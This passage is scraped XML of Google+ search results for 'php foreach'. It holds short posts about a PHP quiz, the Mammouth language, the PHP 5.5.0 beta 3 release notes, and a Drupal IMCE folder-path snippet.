+Meer lezen (22 regels)Minder weergeven</title><thumb cache="FW14-topics-docs/e122/7471_04_thumb.jpg">https://lh3.googleusercontent.com/-qn1lIMfHHko/Tp1wf-RiQdI/AAAAAAAAAHE/Qm5TLIhoAYo/w426-h453/ed3_frame_v2.0_wip_012.jpg</thumb></snippet><snippet id="FW14-e122-7471-05"><link>https://plus.google.com/s/php%20foreach/photos/101913010405667384297/albums/5740490755157290513/5740490756874123602</link><title>Damit bin ich zufrieden: 21 von 25 (leichten) PHP-/MySQL-Fragen richtig beantwortet :) 
+Und das nach 3 Monaten App-Entwicklung in Objective-C, 1 Monat Testautomatisierung in SenseTalk, Bugfixing in C# und aktuell Solr-Entwicklung in Java EE. 
+Ich kann mir die gerade notwendige for-/foreach-Syntax nie merken, zum Glück gibt's dafür gute IDEs ;) 
+PHP- &amp; MySQL-Quiz von Sitepoint: http://www.sitepoint.com/quiz-phpmysql-book/ 
+via +Veljko Sekelj﻿
+
+Meer weergevenMinder weergeven  ·  Vertalen</title><thumb cache="FW14-topics-docs/e122/7471_05_thumb.jpg">https://lh5.googleusercontent.com/-Z8a4y88Ljkc/T6pR7c_lOVI/AAAAAAAABnI/05k8bi8xXYk/w426-h603/quiz-php.jpg</thumb></snippet><snippet id="FW14-e122-7471-06"><link>https://plus.google.com/s/php%20foreach/photos/117159199690429135771/albums/5685701513447161905/5685666297403193474</link><title>Tuto knihu jsem otevřel, zjístil jsem jednu zajímavost... :-) Prošel jsem pár stránek a zjístil, že tam nebyl použít ani jeden foreach, ale for a sizeof! :D #php #php6﻿
+
+Meer weergevenMinder weergeven  ·  Vertalen</title><thumb cache="FW14-topics-docs/e122/7471_06_thumb.jpg">https://lh3.googleusercontent.com/-9Dnmke6BDy0/TueLX6AguII/AAAAAAAAHdQ/DDZAJFaayyI/w426-h321/IMG_20111213_163023.jpg</thumb></snippet><snippet id="FW14-e122-7471-07"><link>https://plus.google.com/s/php%20foreach/photos/112440946419774903530/albums/5900605527174175297/5900605529950658738</link><title>A small language that compiles into PHP, written in Javascript 
+To try mammouth, visit: http://btwael.github.io/mammouth/#try:{{%0Ahello%20%3D%20%27Hello%20Mammouth%27%0Aecho%28hello%29%0A}} 
+For documentation, usage, and examples, see: http://btwael.github.io/mammouth 
+To suggest a feature, report a bug, or general discussion: http://github.com/btwael/mammouth/issues/ 
+
+and thank you :)﻿
+
+Meer weergevenMinder weergeven  ·  Vertalen</title><thumb cache="FW14-topics-docs/e122/7471_07_thumb.png">https://lh5.googleusercontent.com/-gxJOxw0cC-U/UeMpd3xqILI/AAAAAAAAAN0/FFNjTzRm62A/w426-h568/photo.jpg</thumb></snippet><snippet id="FW14-e122-7471-08"><link>https://plus.google.com/s/php%20foreach/photos/108236131842416283132/albums/5860045013430402961/5860045014378657810?sqi=109728488971985783565&amp;sqsi=fa20c700-b88b-4b88-acf3-b963ed12a781</link><title>When I discovered that PHP is the most used server-side programming language in the world.﻿
+
+Meer weergevenMinder weergeven  ·  Vertalen</title><thumb cache="FW14-topics-docs/e122/7471_08_thumb.gif">https://lh6.googleusercontent.com/-wnS7UraUORk/UVMP5InWuBI/AAAAAAAADno/YPH_VJ_OflI/w426-h295/photo.jpg</thumb></snippet><snippet id="FW14-e122-7471-09"><link>https://plus.google.com/s/php%20foreach/photos/109064253798905195298/albums/5866239229005659105/5866239232948663954?authkey=CPDcjrnerY22ZA</link><title>New component for #EasyPHP 12.1 : #PHP 5.5.0 beta 3 
+http://www.easyphp.org/components.php 
+
+The PHP development team announces the release of the 3rd beta of PHP 5.5.0. This release fixes some bugs against beta 2. 
+THIS IS A DEVELOPMENT PREVIEW - DO NOT USE IT IN PRODUCTION! 
+
+PHP 5.5.0beta3 is shipped with some bug fixes and improvements. Here is an incomplete list: 
+\- Drop support for bison &lt; 2.4 when building PHP from GIT source. 
+\- Fixed bug #54567 (DateTimeZone serialize/unserialize) 
+\- Fixed bug #64555 (foreach no longer copies keys if they are interned) 
+\- Fixed bug #64578 (debug_backtrace in set_error_handler corrupts zend heap) 
+
+You can read the full list of changes in the NEWS file contained in the release archive. 
+
+For source downloads of PHP 5.5.0beta3 please visit the download page, Windows binaries can be found on windows.php.net/qa/. 
+
+Our next beta is expected for April 25th. RC should follow. 
+
+Thank you for supporting PHP.﻿
+
+Meer lezen (22 regels)Minder weergeven  ·  Vertalen</title><thumb cache="FW14-topics-docs/e122/7471_09_thumb.png">https://lh3.googleusercontent.com/-JNkCV78PGVw/UWkRgG9ddpI/AAAAAAAAAts/ZvO9G0uUcKg/w426-h237/screenshot_PHP_550_beta3.png</thumb></snippet><snippet id="FW14-e122-7471-10"><link>https://plus.google.com/s/php%20foreach/photos/116154806457967424005/albums/5686108688912127809/5686108686951760658</link><title>If you want that directories in browser of #IMCE correspond to the #OG (#Organigroup) of the user add : 
+
+php: $names = array(); foreach($user-&gt;og_groups as $group){array_push($names,$group[title]);}return $names; 
+
+in the folder path. #drupal﻿
+
+Meer weergevenMinder weergeven  ·  Vertalen</title><thumb cache="FW14-topics-docs/e122/7471_10_thumb.png">https://lh4.googleusercontent.com/-eaez6tsinXk/TukduXgFwxI/AAAAAAAAABY/_g-vezTUDGI/w426-h237/screenimce.PNG</thumb></snippet></snippets></search_results>
